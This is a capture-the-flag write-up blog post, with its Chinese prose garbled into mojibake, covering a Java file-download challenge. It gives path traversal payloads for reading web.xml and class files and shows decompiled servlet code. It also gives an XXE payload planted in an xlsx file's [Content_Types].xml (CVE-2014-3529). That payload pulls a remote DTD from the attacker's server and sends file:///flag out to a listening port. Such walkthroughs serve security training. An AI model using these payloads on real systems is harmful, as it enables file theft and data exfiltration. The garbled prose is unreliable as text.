---
layout: post
title: é’é¾™ FIlejavaé¢˜ç›®æ¶‰åŠxxe
categories: [blog ]
tags: [Ctf,]
description: "å½“æ—¶ç¦äº†éå¸¸å¤šçš„ç±»"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.com
---

### `å‰è¨€`

```java
æœ€è¿‘ä¸çŸ¥é“å­¦å•¥ï¼Œæƒ³å­¦Welgicä½†æ˜¯å¤ªéš¾äº†ç›´æ¥åŠé€€æˆ‘ï¼ŒğŸ˜”åˆ·åˆ·javaé¢˜æ¥
```

## [ç½‘é¼æ¯ 2020é’é¾™ç»„]FileJava

```java
å°æ˜åŒå­¦æŠŠæœ€è¿‘å¼€å‘çš„ä¸€ä¸ªç®€æ˜“æ–‡ä»¶ä¸Šä¼ ç³»ç»ŸæŒ‚åˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œä½†è¿‡äº†æ®µæ—¶é—´æ”¶åˆ°äº†æ¼æ´æŠ¥è­¦ï¼Œä½ èƒ½å¸®ä»–æ‰¾åˆ°æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜å—ï¼Ÿ
è¯¥é¢˜ç›®å¤ç°ç¯å¢ƒå°šæœªå–å¾—ä¸»åŠæ–¹åŠå‡ºé¢˜äººç›¸å…³æˆæƒï¼Œå¦‚æœä¾µæƒï¼Œè¯·è”ç³»ç®¡ç†å‘˜åˆ é™¤
```

é¦–å…ˆåˆ†æä¸€ä¸‹é¢˜ç›®ï¼šæ²¡æœ‰ç»™å‡ºé™„ä»¶ï¼Œæ‰«ç›®å½•ä¹Ÿæ²¡å‘ç°ï¼Œç•Œé¢æ˜¯ä¸€ä¸ªç™»é™†æ¡†çš„æ¨¡æ ·

è‚¯å®šä¸æ˜¯è€ƒå¯Ÿé“¾å­ï¼Œåº”è¯¥æ˜¯ä¸€äº›åœ¨CMSä¸­çš„æ¼æ´ï¼Œæ¯”å¦‚TOP10è¿™ç§

é€šè¿‡å°è¯•å‘ç°äº†å¤§æ¦‚åç«¯çš„åŠŸèƒ½ï¼š

1. é¦–å…ˆUploadServleté€‰æ‹©æ–‡ä»¶ä¸Šä¼ ï¼Œä¼šåœ¨æ–‡ä»¶åå‰é¢åŠ ä¸€ä¸²çš„éšæœºå­—ç¬¦ï¼Œå¯¼è‡´æ–‡ä»¶åä¸å¯æ§
2. ç‚¹å‡»ä¸‹è½½æŒ‰é’® DownloadServlet?filename=0106e2eb-0d80-4f90-b4b0-ee523605a54a_aa.txt å°±ä¼šè¿™æ ·
3. æœ¬æ¥ä»¥ä¸ºæœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œä½†åç«¯åº”è¯¥æœ‰æ ¡éªŒï¼Œä¼šè¿”å›è¯¥èµ„æºå·²åˆ é™¤è¿™ç§

æ­£åœ¨è‹¦æ¼çš„æ—¶å€™æœ‰äº†ä¸€ä¸¢ä¸¢è½¬æœºï¼Œå‘ç°åˆšæ‰æ²¡æœ‰è¯»åˆ°æ˜¯å› ä¸º../çš„æ•°é‡è¿˜ä¸å¤Ÿï¼Œæ—¢ç„¶æœ‰ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé‚£ä¹ˆæ„Ÿè§‰éœ€è¦è¯»åˆ°ä¸€ä¸ªä¸»æ–‡ä»¶ç±»ä¼¼app.pyçš„é‚£ç§,å‘ƒå‘ƒå‘ƒä½†è¿˜æ˜¯æ²¡æ‰¾åˆ°æºæ–‡ä»¶ï¼Œéš¾é“çœŸçš„ç›´æ¥ç›²æµ‹å˜›ï¼Ÿï¼Ÿï¼Ÿ

![image-20231024171454416](../img/final/image-20231024171454416.png)

æ¶¨çŸ¥è¯†äº†ï¼Œçœ‹wpå‘ç°æ˜¯è¯»å–web.xmlï¼Œè¿™ä¸ªåˆ°ä¸é™Œç”Ÿå°±æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œé…ç½®è·¯ç”±çš„

```java
filename=../../../../web.xml
filename=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
```

![image-20231024173125847](../img/final/image-20231024173125847.png)

å‘ƒå‘ƒåˆé‡åˆ°æ–°çš„éš¾é¢˜äº†ï¼Œæ€ä¹ˆè¯»åˆ°é‡Œé¢çš„æ–‡ä»¶å‘¢ï¼ˆç›´æ¥çœ‹æœ¬åœ°tomcatæœåŠ¡å™¨çš„ç»“æ„å³å¯ï¼Œä½†æ˜¯è¯»ä¸åˆ°å‘€ï¼‰

ç›´æ¥æ ¹æ®xmlçš„ä½ç½®æä¸€ä¸‹

```java
../../../../WEB-INF/web.xml
		../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class
    	../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class
        ../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class
```

å°±ä¸‰ä¸ªç±»ä¸å¤ªå¤šï¼Œéƒ½ä¸‹è½½ä¸‹æ¥

```java
        cn.abc.servlet.DownloadServlet
        cn.abc.servlet.ListFileServlet
        cn.abc.servlet.UploadServlet
```

### `ListFileServlet.java`

ä¸€ä¸ªtomcatæœåŠ¡

```java
public class ListFileServlet extends HttpServlet {
    private static final long serialVersionUID = 1;

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doPost(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        getServletContext().getRealPath("/WEB-INF/upload");//å¾—åˆ°ä¸Šä¼ çš„çœŸå®è·¯å¾„
        Map<String, String> fileNameMap = new HashMap<>();
        String saveFilename = (String) request.getAttribute("saveFilename");
        String filename = (String) request.getAttribute("filename");
        System.out.println("saveFilename" + saveFilename);
        System.out.println("filename" + filename);
        saveFilename.substring(saveFilename.indexOf("_") + 1);
        fileNameMap.put(saveFilename, filename);
        request.setAttribute("fileNameMap", fileNameMap);
        request.getRequestDispatcher("/listfile.jsp").forward(request, response);
    }
}
```

### `UploadServlet`

```java
public class UploadServlet extends HttpServlet {
    private static final long serialVersionUID = 1;
    
    protected void doPost(javax.servlet.http.HttpServletRequest r6, javax.servlet.http.HttpServletResponse r7) throws javax.servlet.ServletException, java.io.IOException {
        throw new UnsupportedOperationException("Method not decompiled: cn.abc.servlet.UploadServlet.doPost(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse):void");
    }

    private String makeFileName(String filename) {
        return UUID.randomUUID().toString() + "_" + filename;//é‡
    }

    private String makePath(String filename, String savePath) {
        int hashCode = filename.hashCode();
        String dir = savePath + "/" + (hashCode & 15) + "/" + ((hashCode & 240) >> 4);
        File file = new File(dir);
        if (!file.exists()) {
            file.mkdirs();
        }
        return dir;
    }
}
```

### `DownloadServlet `

```java
public class DownloadServlet extends HttpServlet {
    private static final long serialVersionUID = 1;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String fileName = new String(request.getParameter("filename").getBytes("ISO8859-1"), "UTF-8");
        //è¿™é‡Œçš„filenameé€šè¿‡æˆ‘ä»¬ä¼ å‚æ¥ç¡®å®š
        System.out.println("filename=" + fileName);
        
        if (fileName == null || !fileName.toLowerCase().contains("flag")) {
            //æ–‡ä»¶ä¸åŒ…å«flagè¿›å»
            String path = findFileSavePathByFileName(fileName, getServletContext().getRealPath("/WEB-INF/upload"));
            if (!new File(path + "/" + fileName).exists()) {
                request.setAttribute("message", "æ‚¨è¦ä¸‹è½½çš„èµ„æºå·²è¢«åˆ é™¤!");
                request.getRequestDispatcher("/message.jsp").forward(request, response);
                return;
            }
            response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(fileName.substring(fileName.indexOf("_") + 1), "UTF-8"));
            FileInputStream in = new FileInputStream(path + "/" + fileName);
            ServletOutputStream out = response.getOutputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len = in.read(buffer);
                if (len > 0) {
                    out.write(buffer, 0, len);
                } else {
                    in.close();
                    out.close();
                    return;
                }
            }
        } else {
            request.setAttribute("message", "ç¦æ­¢è¯»å–");
            request.getRequestDispatcher("/message.jsp").forward(request, response);
        }
    }

    public String findFileSavePathByFileName(String filename, String saveRootPath) {
        int hashCode = filename.hashCode();
        String dir = saveRootPath + "/" + (hashCode & 15) + "/" + ((hashCode & 240) >> 4);
        File file = new File(dir);
        if (!file.exists()) {
            file.mkdirs();
        }
        return dir;
    }
}
```

è¿™é‡Œé‡åˆ°äº†ç¬¬ä¸€ä¸ªå‘ï¼Œä½¿ç”¨jd-guiåç¼–è¯‘è½¯ä»¶æœ‰çš„ä»£ç è¯†åˆ«ä¸å‡ºæ¥ä¼šç›´æ¥çœç•¥ï¼Œä¸å¦‚ç›´æ¥æ‹–åˆ°ideaä¸­ç›´æ¥è¿›è¡Œç¼–è¯‘

![image-20231024181617648](../img/final/image-20231024181617648.png)

æœ€ç»ˆçš„uploadServlet

```java
 protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String savePath = this.getServletContext().getRealPath("/WEB-INF/upload");
        String tempPath = this.getServletContext().getRealPath("/WEB-INF/temp");
        File tempFile = new File(tempPath);
        if (!tempFile.exists()) {
            tempFile.mkdir();
        }

        String message = "";

        try {
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(102400);
            factory.setRepository(tempFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setHeaderEncoding("UTF-8");
            upload.setFileSizeMax(1048576L);
            upload.setSizeMax(10485760L);
            if (!ServletFileUpload.isMultipartContent(request)) {
                return;
            }

            List<FileItem> list = upload.parseRequest(request);
            Iterator var10 = list.iterator();

            label56:
            while(true) {
                while(true) {
                    if (!var10.hasNext()) {
                        break label56;
                    }

                    FileItem fileItem = (FileItem)var10.next();
                    String filename;
                    String fileExtName;
                    if (fileItem.isFormField()) {
                        filename = fileItem.getFieldName();
                        fileExtName = fileItem.getString("UTF-8");
                    } else {
                        filename = fileItem.getName();
                        if (filename != null && !filename.trim().equals("")) {
                            fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
                            InputStream in = fileItem.getInputStream();
                            if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
                                try {
                                    Workbook wb1 = WorkbookFactory.create(in);
                                    Sheet sheet = wb1.getSheetAt(0);
                                    System.out.println(sheet.getFirstRowNum());
                                } catch (InvalidFormatException var20) {
                                    System.err.println("poi-ooxml-3.10 has something wrong");
                                    var20.printStackTrace();
                                }
                            }

                            String saveFilename = this.makeFileName(filename);
                            request.setAttribute("saveFilename", saveFilename);
                            request.setAttribute("filename", filename);
                            String realSavePath = this.makePath(saveFilename, savePath);
                            FileOutputStream out = new FileOutputStream(realSavePath + "/" + saveFilename);
                            byte[] buffer = new byte[1024];
                            int len = false;

                            int len;
                            while((len = in.read(buffer)) > 0) {
                                out.write(buffer, 0, len);
                            }

                            in.close();
                            out.close();
                            message = "æ–‡ä»¶ä¸Šä¼ æˆåŠŸ!";
                        }
                    }
                }
            }
```

```java
if (filename.startsWith("excel-") && "xlsx".equals(fileExtName)) {
                                try {
                                    Workbook wb1 = WorkbookFactory.create(in);
                                    Sheet sheet = wb1.getSheetAt(0);
                                    System.out.println(sheet.getFirstRowNum());
```

æ ¹æ®æ–‡ç« è¯´æ˜¯CVE-2014-3529,excelå’Œxxeçš„æ¼æ´çš„ç»“åˆ

å…ˆæ–°å»ºä¸€ä¸ªexcel-1.xlsxæ–‡ä»¶ï¼Œå†æ”¹åç¼€ä¸ºzipï¼Œè§£å‹ç¼©ï¼Œå¯¹æ–‡ä»¶å¤¹é‡Œé¢çš„[Content_Types].xmlè¿›è¡Œä¿®æ”¹ï¼Œä¿®æ”¹å®Œåå†å‹ç¼©æˆzipï¼Œæ”¹åç¼€ä¸ºxlsxã€‚

```java
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % remote SYSTEM "http://æœåŠ¡å™¨ip/1.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

ç„¶ååœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šé¢æ–°å»ºä¸€ä¸ª1.dtdï¼Œå†…å®¹ä¸ºï¼š

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://æœåŠ¡å™¨ip:ç›‘å¬ç«¯å£/%file;'>">
```

æ¥ç€ç›‘å¬è‡ªå·±çš„æœåŠ¡å™¨çš„9999ç«¯å£ï¼Œç„¶åä¸Šä¼ æ–‡ä»¶ã€‚

![image-20231024183517382](../img/final/image-20231024183517382.png)

![image-20231024183604608](../img/final/image-20231024183604608.png)

å…·ä½“ä¸ºå•¥excelä¼šè§¦å‘xxeè¿˜æ²¡ç»†è·Ÿï¼Œè¿™é‡Œå…ˆç•™ä¸€ä¸‹æœ‰æ—¶å€™è·Ÿï¼ˆæ¶¦å»è¡¥ä½œä¸šäº†
